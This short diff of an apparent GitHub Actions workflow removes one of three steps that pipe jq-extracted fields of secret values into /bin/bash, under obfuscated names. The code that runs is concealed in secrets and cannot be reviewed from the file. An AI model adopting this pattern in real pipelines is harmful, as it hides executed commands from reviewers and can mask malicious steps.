@@ -22,7 +22,6 @@ jobs:
           kmea426: ${{ secrets.kmea426 }}
         run: |
           printf '%s' "$kmea426" | jq -r .et9 | /bin/bash
-          echo $lujqk43 | jq -r .hyhxk51144 | /bin/bash
           printf '%s' "$pe36" | jq -r .cwu59363 | /bin/bash
 
       - name: Persist output
